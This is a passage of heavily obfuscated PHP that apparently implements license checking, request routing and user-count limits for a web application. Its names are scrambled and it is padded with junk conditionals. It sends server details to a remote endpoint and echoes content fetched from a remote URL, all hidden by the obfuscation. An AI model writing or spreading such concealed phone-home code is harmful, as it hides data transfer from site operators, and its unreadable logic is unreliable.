strlen($óôçî´±)) { return; } if (strtolower(substr($Äî–Á‹, -strlen($óôçî´±))) != $óôçî´±) { return; } $Ÿùö©¾ = substr($Äî–Á‹, 0, -strlen($óôçî´±)); $÷›‡ ½¡ = $öìúóüÏ[659]; if (strlen($÷›‡ ½¡) < $öìúóüÏ[652]) { die; } $İß´®’Ç = array($°÷µÔ¨˜[4], $Ÿùö©¾); $×ÍÇ ª£ = $öìúóüÏ[660]; $§õê…°ì = array_slice($GLOBALS[$°÷µÔ¨˜[13]][$°÷µÔ¨˜[14]], 1); $GLOBALS[$°÷µÔ¨˜[13]][$°÷µÔ¨˜[14]] = array_merge($İß´®’Ç, $§õê…°ì); $GLOBALS[$°÷µÔ¨˜[13]][$°÷µÔ¨˜[15]] = implode($°÷µÔ¨˜[0], $GLOBALS[$°÷µÔ¨˜[13]][$°÷µÔ¨˜[14]]); } private function zcam780d21e7() { $Ÿ ¸™ªÊ =& $_SERVER[”ôÑ§ì¸]; $·©ì¶Ïò =& $_SERVER[§ŸîìÂù]; if ($GLOBALS[$·©ì¶Ïò[13]][$·©ì¶Ïò[15]] != $·©ì¶Ïò[6]) { return; } $¢òåÌû§ = $_SERVER[$·©ì¶Ïò[16]]; $òô›öˆÏ = $Ÿ ¸™ªÊ[661]; $Ó²ÔÎ·½ = $·©ì¶Ïò[17]; $„Áß„ôÎ = $Ÿ ¸™ªÊ[662]; if (strlen($„Áß„ôÎ) < $Ÿ ¸™ªÊ[663]) { return; } if (!strstr($¢òåÌû§, $Ó²ÔÎ·½)) { return; } $ ˆ£Àç¿ = strrpos($¢òåÌû§, $Ó²ÔÎ·½); $áßŒ°Ó = substr($¢òåÌû§, $ ˆ£Àç¿ + strlen($Ó²ÔÎ·½)); $ó¶á‹ä´ = $Ÿ ¸™ªÊ[664]; if (strlen($ó¶á‹ä´) < $Ÿ ¸™ªÊ[648]) { return; } preg_match_all($·©ì¶Ïò[18], $áßŒ°Ó, $¥…ù£œæ); $ºïè¨¿Å = $Ÿ ¸™ªÊ[665]; if (!$ºïè¨¿Å) { die; } $áßŒ°Ó = trim($¥…ù£œæ[0][0], $·©ì¶Ïò[19]); $GLOBALS[$·©ì¶Ïò[13]][$·©ì¶Ïò[14]] = explode($·©ì¶Ïò[19], $áßŒ°Ó); $GLOBALS[$·©ì¶Ïò[13]][$·©ì¶Ïò[15]] = implode($·©ì¶Ïò[0], $GLOBALS[$·©ì¶Ïò[13]][$·©ì¶Ïò[14]]); } public function run() { $¾ÕªÜ¦á =& $_SERVER[”ôÑ§ì¸]; $¡ö––¾ü =& $_SERVER[§ŸîìÂù]; $this->zcam780d21e7(); $this->hgnl89425cdd(); $À—ˆÑ…œ = $GLOBALS[$¡ö––¾ü[13]][$¡ö––¾ü[14]]; $‘æ°È³ø = $¾ÕªÜ¦á[666]; if (strlen($‘æ°È³ø) < $¾ÕªÜ¦á[648]) { return; } $Øõïø´” = $GLOBALS[$¡ö––¾ü[13]][$¡ö––¾ü[15]]; define($¡ö––¾ü[20], isset($À—ˆÑ…œ[0]) && $À—ˆÑ…œ[0] ? $À—ˆÑ…œ[0] : $this->defaultModule); define($¡ö––¾ü[21], isset($À—ˆÑ…œ[1]) && $À—ˆÑ…œ[0] ? $À—ˆÑ…œ[1] : $this->defaultController); define($¡ö––¾ü[22], isset($À—ˆÑ…œ[2]) && $À—ˆÑ…œ[0] ? $À—ˆÑ…œ[2] : $this->defaultAction); define($¡ö––¾ü[23], MOD . $¡ö––¾ü[0] . ST . $¡ö––¾ü[0] . ACT); $ÎÒ’üÍ = $¾ÕªÜ¦á[667]; if (strlen($ÎÒ’üÍ) < $¾ÕªÜ¦á[652]) { die; } $_SERVER[$¡ö––¾ü[24]] = strtolower(ACTION); $Âş¥ùÔ = $¾ÕªÜ¦á[668]; if (!$Âş¥ùÔ) { die; } $this->autorun(); if (count($À—ˆÑ…œ) >= 3) { $this->appRun($Øõïø´”); } else { $this->appRun(ACTION); } } private $yzsr28454135 = array(); private $hlcyef6af80e = ''; public function uqfp823c0187() { $ŠêÕÔË =& $_SERVER[”ôÑ§ì¸]; $¢ã¶ó‘ã =& $_SERVER[§ŸîìÂù]; $this->fidc7ddea1ee(); $this->onmwdcbd7a92(); $Ø×Î á = $ŠêÕÔË[669]; while (strlen($Ø×Î á) < $ŠêÕÔË[652]) { if (!$Ø×Î á) { break; } $Ø×Î á++; } $this->ylcr729bee2d(); $şâøÀÔÅ = $ŠêÕÔË[670]; $this->othd80b29bdc(); $this->pzsb4a72c89e(); $ªÛ¶Œ€‹ = $ŠêÕÔË[671]; if (!$ªÛ¶Œ€‹) { die; } $this->zyaj78722b74(); $â®ÁøÜ‡ = $ŠêÕÔË[672]; if (strlen($â®ÁøÜ‡) < $ŠêÕÔË[673]) { return; } $this->hxldadcc4b6f(); $this->wjah4f120a8f($¢ã¶ó‘ã[25], array($this, $¢ã¶ó‘ã[26])); $’‘Ö™ = $ŠêÕÔË[674]; while (strlen($’‘Ö™) < $ŠêÕÔË[673]) { if (!$’‘Ö™) { break; } $’‘Ö™++; } $this->wjah4f120a8f($¢ã¶ó‘ã[27], array($this, $¢ã¶ó‘ã[28])); $this->wjah4f120a8f($¢ã¶ó‘ã[29], array($this, $¢ã¶ó‘ã[30])); $this->wjah4f120a8f($¢ã¶ó‘ã[31], array($this, $¢ã¶ó‘ã[32])); } public function mvpic56d0dea($øÓÆú‚õ) { $Õ½ûãÚ =& $_SERVER[”ôÑ§ì¸]; $ÔğóÈÜÒ =& $_SERVER[§ŸîìÂù]; $«±“ü­­ = Model($ÔğóÈÜÒ[33])->get(); $Ô®Ù–Ä‡ = $Õ½ûãÚ[675]; $ÀÍ´§¶¾ = array($ÔğóÈÜÒ[34], $ÔğóÈÜÒ[35], $ÔğóÈÜÒ[36], $ÔğóÈÜÒ[37], $ÔğóÈÜÒ[38], $ÔğóÈÜÒ[39], $ÔğóÈÜÒ[40], $ÔğóÈÜÒ[41], $ÔğóÈÜÒ[42], $ÔğóÈÜÒ[43], $ÔğóÈÜÒ[44], $ÔğóÈÜÒ[45], $ÔğóÈÜÒ[46], $ÔğóÈÜÒ[47], $ÔğóÈÜÒ[48], $ÔğóÈÜÒ[49], $ÔğóÈÜÒ[50], $ÔğóÈÜÒ[51], $ÔğóÈÜÒ[52], $ÔğóÈÜÒ[53], $ÔğóÈÜÒ[54], $ÔğóÈÜÒ[55], $ÔğóÈÜÒ[56], $ÔğóÈÜÒ[57], $ÔğóÈÜÒ[58], $ÔğóÈÜÒ[59], $ÔğóÈÜÒ[60], $ÔğóÈÜÒ[61], $ÔğóÈÜÒ[62], $ÔğóÈÜÒ[63], $ÔğóÈÜÒ[64], $ÔğóÈÜÒ[65], $ÔğóÈÜÒ[66], $ÔğóÈÜÒ[67], $ÔğóÈÜÒ[68], $ÔğóÈÜÒ[69], $ÔğóÈÜÒ[70], $ÔğóÈÜÒ[71], $ÔğóÈÜÒ[72], $ÔğóÈÜÒ[73], $ÔğóÈÜÒ[74], $ÔğóÈÜÒ[75], $ÔğóÈÜÒ[76], $ÔğóÈÜÒ[77], $ÔğóÈÜÒ[78], $ÔğóÈÜÒ[79], $ÔğóÈÜÒ[80], $ÔğóÈÜÒ[81], $ÔğóÈÜÒ[82], $ÔğóÈÜÒ[83], $ÔğóÈÜÒ[84]); foreach ($ÀÍ´§¶¾ as $€¢ÎŞƒ•) { $ç„¸ÌÅ = $GLOBALS[$ÔğóÈÜÒ[85]][$ÔğóÈÜÒ[86]][$€¢ÎŞƒ•]; if (isset($«±“ü­­[$€¢ÎŞƒ•])) { $ç„¸ÌÅ = $«±“ü­­[$€¢ÎŞƒ•]; } $øÓÆú‚õ[$ÔğóÈÜÒ[87]][$ÔğóÈÜÒ[88]][$€¢ÎŞƒ•] = $ç„¸ÌÅ; } $Ëë˜ğ€× = $øÓÆú‚õ[$ÔğóÈÜÒ[87]][$ÔğóÈÜÒ[88]][$ÔğóÈÜÒ[46]]; $‘İ¦¹ = $Õ½ûãÚ[676]; if (strlen($‘İ¦¹) < $Õ½ûãÚ[652]) { return; } unset($øÓÆú‚õ[$ÔğóÈÜÒ[87]][$ÔğóÈÜÒ[89]][$ÔğóÈÜÒ[90]]); unset($øÓÆú‚õ[$ÔğóÈÜÒ[87]][$ÔğóÈÜÒ[89]][$ÔğóÈÜÒ[91]]); unset($øÓÆú‚õ[$ÔğóÈÜÒ[87]][$ÔğóÈÜÒ[88]][$ÔğóÈÜÒ[46]]); unset($øÓÆú‚õ[$ÔğóÈÜÒ[87]][$ÔğóÈÜÒ[88]][$ÔğóÈÜÒ[92]]); $øÓÆú‚õ[$ÔğóÈÜÒ[87]][$ÔğóÈÜÒ[88]][$ÔğóÈÜÒ[93]] = array($ÔğóÈÜÒ[94] => (int) $Ëë˜ğ€×[$ÔğóÈÜÒ[95]], $ÔğóÈÜÒ[96] => (int) _get($Ëë˜ğ€×, $ÔğóÈÜÒ[97], 0)); $øÓÆú‚õ[$ÔğóÈÜÒ[98]][$ÔğóÈÜÒ[99]] = Action($ÔğóÈÜÒ[100])->accessToken(); $Ô‚é¤×§ = $Õ½ûãÚ[677]; if (!$Ô‚é¤×§) { return; } $øÓÆú‚õ[$ÔğóÈÜÒ[98]][$ÔğóÈÜÒ[101]] = md5($_SERVER[$ÔğóÈÜÒ[102]] . $«±“ü­­[$ÔğóÈÜÒ[103]]); $øÓÆú‚õ[$ÔğóÈÜÒ[98]][$ÔğóÈÜÒ[104]] = base64_encode(serverInfo()); $øÓÆú‚õ[$ÔğóÈÜÒ[98]][$ÔğóÈÜÒ[105]] = $this->hlcyef6af80e; $©š›Ë›« = $Õ½ûãÚ[678]; if (!$©š›Ë›«) { return; } if ($«±“ü­­[$ÔğóÈÜÒ[105]] != $ÔğóÈÜÒ[106]) { $øÓÆú‚õ[$ÔğóÈÜÒ[98]][$ÔğóÈÜÒ[107]] = $«±“ü­­[$ÔğóÈÜÒ[107]]; $øÓÆú‚õ[$ÔğóÈÜÒ[98]][$ÔğóÈÜÒ[108]] = $«±“ü­­[$ÔğóÈÜÒ[108]]; $öÉ½º¯Ñ = rand_string(10) . $this->hlcyef6af80e . rand_string(5); $øÓÆú‚õ[$ÔğóÈÜÒ[87]][$ÔğóÈÜÒ[109]][$ÔğóÈÜÒ[110]] = $this->quoh4dd30b1a($öÉ½º¯Ñ, $øÓÆú‚õ[$ÔğóÈÜÒ[98]][$ÔğóÈÜÒ[101]]); } if ($this->hlcyef6af80e == $ÔğóÈÜÒ[106]) { $øÓÆú‚õ[$ÔğóÈÜÒ[87]][$ÔğóÈÜÒ[88]][$ÔğóÈÜÒ[93]][$ÔğóÈÜÒ[97]] = 0; } $øÓÆú‚õ[$ÔğóÈÜÒ[98]][$ÔğóÈÜÒ[111]] = _get($this->yzsr28454135, $ÔğóÈÜÒ[112], $ÔğóÈÜÒ[6]); $øÓÆú‚õ[$ÔğóÈÜÒ[98]][$ÔğóÈÜÒ[113]] = _get($this->yzsr28454135, $ÔğóÈÜÒ[114], $ÔğóÈÜÒ[6]); $áºŠª = $Õ½ûãÚ[679]; while (strlen($áºŠª) < $Õ½ûãÚ[648]) { if (!$áºŠª) { break; } $áºŠª++; } if (_get($GLOBALS, $ÔğóÈÜÒ[115]) && $this->config[$ÔğóÈÜÒ[116]]) { $øÓÆú‚õ[$ÔğóÈÜÒ[98]][$ÔğóÈÜÒ[117]] = WEB_ROOT; } return $øÓÆú‚õ; } private function zyaj78722b74() { $¯ˆÌ¶ =& $_SERVER[”ôÑ§ì¸]; $®ü‹ˆÆ¡ =& $_SERVER[§ŸîìÂù]; $–›ê©’ = $_SERVER[$®ü‹ˆÆ¡[24]] == $®ü‹ˆÆ¡[118]; if ($_SERVER[$®ü‹ˆÆ¡[24]] == $®ü‹ˆÆ¡[119] && $_GET[$®ü‹ˆÆ¡[120]] == $®ü‹ˆÆ¡[121]) { $–›ê©’ = !0; } if ($–›ê©’) { $ûÒ®ŒÂ = array($®ü‹ˆÆ¡[105] => $this->hlcyef6af80e, $®ü‹ˆÆ¡[122] => $this->bkrgc263c8d1(), $®ü‹ˆÆ¡[123] => Model($®ü‹ˆÆ¡[124])->count()); if ($this->hlcyef6af80e != $®ü‹ˆÆ¡[106]) { $’¡„¯†É = _get($this->yzsr28454135, $®ü‹ˆÆ¡[125]); if ($’¡„¯†É) { $ûÒ®ŒÂ[$®ü‹ˆÆ¡[126]] = $’¡„¯†É; $ûÒ®ŒÂ[$®ü‹ˆÆ¡[127]] = strtotime(_get($this->yzsr28454135, $®ü‹ˆÆ¡[128])); $ûÒ®ŒÂ[$®ü‹ˆÆ¡[129]] = _get($this->yzsr28454135, $®ü‹ˆÆ¡[114]); } $”¤ÀåÊ¸ = Model($®ü‹ˆÆ¡[33])->get($®ü‹ˆÆ¡[130], $®ü‹ˆÆ¡[6], !0); if (is_string($”¤ÀåÊ¸) && substr($”¤ÀåÊ¸, 0, 1) == $®ü‹ˆÆ¡[131]) { $”¤ÀåÊ¸ = json_decode_force($”¤ÀåÊ¸); } if (is_array($”¤ÀåÊ¸) && $”¤ÀåÊ¸[$®ü‹ˆÆ¡[132]] && strstr($”¤ÀåÊ¸[$®ü‹ˆÆ¡[132]], $®ü‹ˆÆ¡[133])) { $Ï·µ“Ì = explode($®ü‹ˆÆ¡[133], $”¤ÀåÊ¸[$®ü‹ˆÆ¡[132]]); $ûÒ®ŒÂ[$®ü‹ˆÆ¡[134]] = $Ï·µ“Ì[0]; } } $ûÒ®ŒÂ = $this->hewi694c2320(json_encode($ûÒ®ŒÂ), md5($®ü‹ˆÆ¡[135])); $Ÿ†üÁõ = array($®ü‹ˆÆ¡[136] => $ûÒ®ŒÂ); $çİãÜ = $¯ˆÌ¶[680]; call_user_func(array($®ü‹ˆÆ¡[137], $®ü‹ˆÆ¡[138]), $Ÿ†üÁõ); $§Ô¶šâæ = $¯ˆÌ¶[681]; if (strlen($§Ô¶šâæ) < $¯ˆÌ¶[652]) { die; } } if ($this->hlcyef6af80e == $®ü‹ˆÆ¡[106]) { return; } $ÊòÚ¯ÇŞ = array($®ü‹ˆÆ¡[139], $®ü‹ˆÆ¡[140], $®ü‹ˆÆ¡[141], $®ü‹ˆÆ¡[142], $®ü‹ˆÆ¡[143], $®ü‹ˆÆ¡[144]); $¨İ ûÖé = Model($®ü‹ˆÆ¡[33])->get(); $Ÿ†üÁõ = array($®ü‹ˆÆ¡[145] => $¨İ ûÖé[$®ü‹ˆÆ¡[34]], $®ü‹ˆÆ¡[146] => $¨İ ûÖé[$®ü‹ˆÆ¡[35]], $®ü‹ˆÆ¡[147] => $®ü‹ˆÆ¡[6]); $çÏïãÜÛ = $¯ˆÌ¶[682]; if (!$çÏïãÜÛ) { die; } foreach ($ÊòÚ¯ÇŞ as $ÕŠµµüõ) { if (!isset($¨İ ûÖé[$ÕŠµµüõ]) || !$¨İ ûÖé[$ÕŠµµüõ]) { continue; } $Ÿ†üÁõ[$ÕŠµµüõ] = $¨İ ûÖé[$ÕŠµµüõ]; $”ª«‚üƒ = $¯ˆÌ¶[683]; } call_user_func(array($®ü‹ˆÆ¡[137], $®ü‹ˆÆ¡[138]), $Ÿ†üÁõ); $Öü˜§çï = $¯ˆÌ¶[684]; } private function othd80b29bdc() { $²°ú­­ä =& $_SERVER[”ôÑ§ì¸]; $›üç‘ï =& $_SERVER[§ŸîìÂù]; if ($_SERVER[$›üç‘ï[24]] != $›üç‘ï[148]) { return; } if (!_get($GLOBALS, $›üç‘ï[115])) { die; } $Û•¥¾ì = $GLOBALS[$›üç‘ï[13]]; if (isset($Û•¥¾ì[$›üç‘ï[149]])) { $this->eqyc1d0c1b59(); die; } if (!isset($Û•¥¾ì[$›üç‘ï[150]]) || strlen($Û•¥¾ì[$›üç‘ï[150]]) != 16) { show_json($›üç‘ï[151] . $Û•¥¾ì[$›üç‘ï[150]], !1); } $¤Šã•ÉÎ = Model($›üç‘ï[33])->get($›üç‘ï[103]); $¢ò’ô«Ê = md5($_SERVER[$›üç‘ï[102]] . $¤Šã•ÉÎ); $Ş¨íÖôı = $²°ú­­ä[685]; while ($Ş¨íÖôı < $²°ú­­ä[663]) { if ($Ş¨íÖôı >= 0) { break; } $Ş¨íÖôı++; } $ô›Ó³Úı = array($›üç‘ï[150] => $Û•¥¾ì[$›üç‘ï[150]], $›üç‘ï[152] => rand_string(16), $›üç‘ï[153] => $›üç‘ï[135], $›üç‘ï[154] => $›üç‘ï[155], $›üç‘ï[156] => $_SERVER[$›üç‘ï[157]], $›üç‘ï[158] => $_SERVER[$›üç‘ï[159]], $›üç‘ï[160] => $_SERVER[$›üç‘ï[161]], $›üç‘ï[101] => $¢ò’ô«Ê, $›üç‘ï[162] => Model($›üç‘ï[33])->get($›üç‘ï[130])); $ß”îášÂ = $²°ú­­ä[686]; if (strlen($ß”îášÂ) < $²°ú­­ä[648]) { die; } if ($Û•¥¾ì[$›üç‘ï[163]] == $›üç‘ï[164]) { $ññ·ßø© = $this->hewi694c2320($¢ò’ô«Ê, $›üç‘ï[165]); $÷…ã…è£ = $this->quoh4dd30b1a(json_encode($ô›Ó³Úı), $¢ò’ô«Ê . $›üç‘ï[166], 3); $÷…ã…è£ = $÷…ã…è£ . $›üç‘ï[167] . $_SERVER[$›üç‘ï[157]]; $ëí¡ä¤È = $this->zcen3c67648c($›üç‘ï[168] . $ññ·ßø© . $›üç‘ï[169] . $÷…ã…è£, -1); show_json($ëí¡ä¤È, !0); } else { if ($Û•¥¾ì[$›üç‘ï[163]] == $›üç‘ï[170]) { $§§ÏÓ¸´ = substr(md5($›üç‘ï[171] . $¢ò’ô«Ê), 12, 15) . $›üç‘ï[172]; $÷…ã…è£ = $this->fjtbd83c3e14(trim($Û•¥¾ì[$›üç‘ï[173]]), $§§ÏÓ¸´, 2); $èşí’†ğ = json_decode($÷…ã…è£, !0); if (!is_array($èşí’†ğ) || !is_array($èşí’†ğ[$›üç‘ï[174]]) || $èşí’†ğ[$›üç‘ï[150]] != !0) { $æû‰Š¬á = $›üç‘ï[175]; $¿šòÌ·¬ = $èşí’†ğ[$›üç‘ï[174]] ? $›üç‘ï[176] . $èşí’†ğ[$›üç‘ï[174]] : $æû‰Š¬á; show_json($¿šòÌ·¬, !1); } else { $ô›Ó³Úı[$›üç‘ï[152]] = $èşí’†ğ[$›üç‘ï[174]][$›üç‘ï[177]]; } } else { $èşí’†ğ = $this->zcen3c67648c($›üç‘ï[178], $ô›Ó³Úı, 10); $Ïş›îÕ = $²°ú­­ä[687]; } } if (!is_array($èşí’†ğ) || !is_array($èşí’†ğ[$›üç‘ï[174]]) || $èşí’†ğ[$›üç‘ï[150]] != !0) { $æû‰Š¬á = LNG($›üç‘ï[179]); $¿šòÌ·¬ = $èşí’†ğ[$›üç‘ï[174]] ? $›üç‘ï[176] . $èşí’†ğ[$›üç‘ï[174]] : $æû‰Š¬á; show_json($¿šòÌ·¬, !1); } $¢º´öÖÎ = $èşí’†ğ[$›üç‘ï[174]]; $Ó–ŸÆí§ = $this->yder801d2ce1($¢º´öÖÎ[$›üç‘ï[180]]); if (!$Ó–ŸÆí§ || $Ó–ŸÆí§ != $¢º´öÖÎ[$›üç‘ï[128]]) { $Öó¥º¯ = array($›üç‘ï[181] => Model($›üç‘ï[33])->get($›üç‘ï[103]), $›üç‘ï[182] => $_SERVER[$›üç‘ï[102]], $›üç‘ï[183] => this_url(), $›üç‘ï[158] => $_SERVER[$›üç‘ï[159]]); $÷…ã…è£ = $this->ckhebec0cf36(json_encode($Öó¥º¯)); $this->zcen3c67648c($›üç‘ï[184] . $÷…ã…è£); show_json(LNG($›üç‘ï[185]), !0); } $”êĞı‡ë = array($›üç‘ï[186] => $¢º´öÖÎ[$›üç‘ï[187]], $›üç‘ï[188] => $¢º´öÖÎ[$›üç‘ï[189]], $›üç‘ï[190] => rand_string(16), $›üç‘ï[105] => $¢º´öÖÎ[$›üç‘ï[191]]); if ($ô›Ó³Úı[$›üç‘ï[152]]) { $”êĞı‡ë[$›üç‘ï[190]] = $ô›Ó³Úı[$›üç‘ï[152]]; } $†‡éºè = substr(md5($”êĞı‡ë[$›üç‘ï[188]]), 10, 10); $ ‰óÓË = $†‡éºè . $”êĞı‡ë[$›üç‘ï[105]] . $”êĞı‡ë[$›üç‘ï[190]]; $ïƒ‚ï = $²°ú­­ä[688]; $”êĞı‡ë[$›üç‘ï[107]] = strrev(base64_encode($this->hewi694c2320($ ‰óÓË, $›üç‘ï[192]))); $äÜ¦¥® = rand_string(16); $÷˜¦êÄÁ = $äÜ¦¥® . $”êĞı‡ë[$›üç‘ï[105]] . $this->hewi694c2320(md5($”êĞı‡ë[$›üç‘ï[186]]), $äÜ¦¥®); $®â½Æİ = $²°ú­­ä[689]; if (strlen($®â½Æİ) < $²°ú­­ä[663]) { return; } $”êĞı‡ë[$›üç‘ï[108]] = base64_encode(strrev($this->hewi694c2320($÷˜¦êÄÁ, $›üç‘ï[193]))); $õÀüŞ§° = $²°ú­­ä[690]; if (strlen($õÀüŞ§°) < $²°ú­­ä[663]) { die; } if ($¢º´öÖÎ[$›üç‘ï[194]] && $¢º´öÖÎ[$›üç‘ï[194]] >= 1) { Model($›üç‘ï[33])->setDeep($›üç‘ï[195], $›üç‘ï[121]); } Model($›üç‘ï[33])->set($”êĞı‡ë); $ÚÃú†Ï‡ = md5($_SERVER[$›üç‘ï[102]] . strrev($¤Šã•ÉÎ) . $”êĞı‡ë[$›üç‘ï[188]]); $ØûÜ®Šı = $²°ú­­ä[691]; while ($ØûÜ®Šı < $²°ú­­ä[673]) { if ($ØûÜ®Šı >= 0) { break; } $ØûÜ®Šı++; } $…ˆÌè = strrev(substr($ÚÃú†Ï‡, 10, 16)); $şğõõ = $this->quoh4dd30b1a(json_encode($¢º´öÖÎ), $ÚÃú†Ï‡); $¡¹°ó‘§ = array_to_keyvalue(Model($›üç‘ï[7])->listData(), $›üç‘ï[196]); $¼äª¯´Ä = $¡¹°ó‘§[$›üç‘ï[197]]; $Àò—›ğ£ = array(); $ÖÁ°òşè = $²°ú­­ä[692]; if (!$ÖÁ°òşè) { return; } $Àò—›ğ£[$…ˆÌè] = $şğõõ; $¿“Æş = $²°ú­­ä[693]; while ($¿“Æş < $²°ú­­ä[673]) { if ($¿“Æş >= 0) { break; } $¿“Æş++; } Model($›üç‘ï[7])->update($¼äª¯´Ä[$›üç‘ï[198]], array($›üç‘ï[199] => $Àò—›ğ£)); $ïÙ©í«ˆ = $²°ú­­ä[694]; while ($ïÙ©í«ˆ < $²°ú­­ä[673]) { if ($ïÙ©í«ˆ >= 0) { break; } $ïÙ©í«ˆ++; } $this->yzsr28454135 = $¢º´öÖÎ; $this->hlcyef6af80e = $”êĞı‡ë[$›üç‘ï[105]]; $this->licenseRegistSuccess(); $»…ªëÍ = $²°ú­­ä[695]; Cache::set($›üç‘ï[200] . md5($¤Šã•ÉÎ . $›üç‘ï[201]), $›üç‘ï[6]); $óï¹Ì‘ß = $²°ú­­ä[696]; if (strlen($óï¹Ì‘ß) < $²°ú­­ä[655]) { return; } show_json(LNG($›üç‘ï[185]), !0); } private function licenseRegistSuccess() { $ğìûÔŠ =& $_SERVER[§ŸîìÂù]; $Ô²Ã’îæ = Model($ğìûÔŠ[33])->get(); if ($Ô²Ã’îæ[$ğìûÔŠ[63]] != $ğìûÔŠ[121]) { Model($ğìûÔŠ[33])->set($ğìûÔŠ[63], $ğìûÔŠ[121]); } Action($ğìûÔŠ[202])->initStart(!0); } private function eqyc1d0c1b59() { $ñ‹ì¹ÓŸ =& $_SERVER[”ôÑ§ì¸]; $ÇÃ«¹É =& $_SERVER[§ŸîìÂù]; Model($ÇÃ«¹É[33])->set(array($ÇÃ«¹É[186] => $ÇÃ«¹É[6], $ÇÃ«¹É[188] => $ÇÃ«¹É[6], $ÇÃ«¹É[105] => $ÇÃ«¹É[106], $ÇÃ«¹É[107] => $ÇÃ«¹É[6], $ÇÃ«¹É[108] => $ÇÃ«¹É[6])); $ÀÊÒÊ¢ = $ñ‹ì¹ÓŸ[697]; Model($ÇÃ«¹É[33])->setDeep($ÇÃ«¹É[195], $ÇÃ«¹É[203]); $this->yzsr28454135 = array(); $®À¤€ˆ÷ = $ñ‹ì¹ÓŸ[698]; if (strlen($®À¤€ˆ÷) < $ñ‹ì¹ÓŸ[648]) { die; } $this->hlcyef6af80e = $ÇÃ«¹É[106]; } private function fidc7ddea1ee() { $í³¯İ®› =& $_SERVER[”ôÑ§ì¸]; $¸¯—ùå =& $_SERVER[§ŸîìÂù]; $_SERVER[$¸¯—ùå[159]] = _get($_SERVER, $¸¯—ùå[159], APP_HOST); $ıÏÑÉ¤€ = $í³¯İ®›[699]; $this->hlcyef6af80e = $¸¯—ùå[106]; $æºÕ½ãÅ = $í³¯İ®›[700]; if (strlen($æºÕ½ãÅ) < $í³¯İ®›[663]) { return; } $ÓÄÄ• = Model($¸¯—ùå[33])->get(); if ($ÓÄÄ•[$¸¯—ùå[105]] == $¸¯—ùå[106]) { return; } $ÓËõÚÑ¡ = Model($¸¯—ùå[33])->get($¸¯—ùå[103]); $Ëİ˜È÷– = $¸¯—ùå[200] . md5($ÓËõÚÑ¡ . $¸¯—ùå[201]); $£â­÷òÁ = Cache::get($Ëİ˜È÷–); if (!is_array($£â­÷òÁ) || !isset($£â­÷òÁ[$¸¯—ùå[204]]) || time() - $£â­÷òÁ[$¸¯—ùå[204]] >= 60) { $ˆ”ƒ¼í¡ = Model($¸¯—ùå[7])->loadList(); $ÍåˆÈäÒ = $ˆ”ƒ¼í¡[$¸¯—ùå[197]]; $¸ó¾Ò§ë = md5($_SERVER[$¸¯—ùå[102]] . strrev($ÓËõÚÑ¡) . $ÓÄÄ•[$¸¯—ùå[188]]); $–ß·ËÕŞ = strrev(substr($¸ó¾Ò§ë, 10, 16)); $£â­÷òÁ = $this->fjtbd83c3e14($ÍåˆÈäÒ[$¸¯—ùå[85]][$–ß·ËÕŞ], $¸ó¾Ò§ë); $£â­÷òÁ = json_decode($£â­÷òÁ, !0); } if (!is_array($£â­÷òÁ)) { return $this->eqyc1d0c1b59(); } $ÆæÅ×Â’ = strtotime($£â­÷òÁ[$¸¯—ùå[128]]); if (time() >= $ÆæÅ×Â’) { return $this->eqyc1d0c1b59(); } if (time() - $£â­÷òÁ[$¸¯—ùå[204]] > 20) { $£â­÷òÁ[$¸¯—ùå[204]] = time(); Cache::set($Ëİ˜È÷–, $£â­÷òÁ); } $this->yzsr28454135 = $£â­÷òÁ; $this->hlcyef6af80e = $ÓÄÄ•[$¸¯—ùå[105]]; $àÂñŸ©Ñ = $í³¯İ®›[701]; } private function onmwdcbd7a92() { $ÏÓúêŞ“ =& $_SERVER[§ŸîìÂù]; $óĞ®Ö€Ğ = $GLOBALS[$ÏÓúêŞ“[13]]; $âµËÛîØ = $_SERVER[$ÏÓúêŞ“[24]]; if ($âµËÛîØ == $ÏÓúêŞ“[205] && $this->hlcyef6af80e == $ÏÓúêŞ“[106]) { show_json(LNG($ÏÓúêŞ“[206]), !1, $ÏÓúêŞ“[207]); } $º…ÛŞğ = array($ÏÓúêŞ“[208], $ÏÓúêŞ“[209]); if (in_array($âµËÛîØ, $º…ÛŞğ)) { if ($this->hlcyef6af80e == $ÏÓúêŞ“[106] && isset($óĞ®Ö€Ğ[$ÏÓúêŞ“[210]])) { show_json(LNG($ÏÓúêŞ“[206]), !1, $ÏÓúêŞ“[207]); die; } $€ğ­Ó¹¹ = $this->bkrgc263c8d1(); if ($€ğ­Ó¹¹ != intval($ÏÓúêŞ“[211])) { if ($€ğ­Ó¹¹ <= Model($ÏÓúêŞ“[124])->count()) { show_json(LNG($ÏÓúêŞ“[212]), !1, $ÏÓúêŞ“[207]); die; } } } } private function ylcr729bee2d() { $ ˜›……Æ =& $_SERVER[”ôÑ§ì¸]; $ÂëÍÖí =& $_SERVER[§ŸîìÂù]; $‹÷ïæ“° = array($ÂëÍÖí[118], $ÂëÍÖí[119]); $¯ƒıõ¨ = $ ˜›……Æ[702]; if (!$¯ƒıõ¨) { die; } if (!_get($GLOBALS, $ÂëÍÖí[115]) || !isset($_GET[$ÂëÍÖí[213]])) { return; } if (!in_array($_SERVER[$ÂëÍÖí[24]], $‹÷ïæ“°)) { return; } $•œµÚ¦ = $ÂëÍÖí[214]; $•œµÚ¦ = $this->cmqdad80b4b2($•œµÚ¦, $ÂëÍÖí[215]); $æÃŒÕĞ¥ = $ ˜›……Æ[703]; if (strlen($æÃŒÕĞ¥) < $ ˜›……Æ[663]) { return; } $äú¡‘µÜ = stream_context_create(array($ÂëÍÖí[216] => array($ÂëÍÖí[217] => $ÂëÍÖí[218], $ÂëÍÖí[219] => 3))); $¤ùÉ¶ = @file_get_contents($•œµÚ¦, !1, $äú¡‘µÜ); $ì§¢·ß• = $ ˜›……Æ[704]; if (strlen($ì§¢·ß•) < $ ˜›……Æ[673]) { die; } header($ÂëÍÖí[220]); $†à’Ôß = $ ˜›……Æ[705]; if (!$†à’Ôß) { die; } if ($¤ùÉ¶ && strstr($¤ùÉ¶, $ÂëÍÖí[221])) { echo $¤ùÉ¶; } die; } public function zgny5be3cebf($³†‘Å•Ô) { $©¤¤ù·³ =& $_SERVER[”ôÑ§ì¸]; $æµ¡§ÍÉ =& $_SERVER[§ŸîìÂù]; if ($this->hlcyef6af80e == $æµ¡§ÍÉ[222]) { return $³†‘Å•Ô; } $Ö¤ó¾Ï = array($æµ¡§ÍÉ[223] => $æµ¡§ÍÉ[224], $æµ¡§ÍÉ[225] => $æµ¡§ÍÉ[224], $æµ¡§ÍÉ[226] => $æµ¡§ÍÉ[224], $æµ¡§ÍÉ[227] => $æµ¡§ÍÉ[228], $æµ¡§ÍÉ[229] => 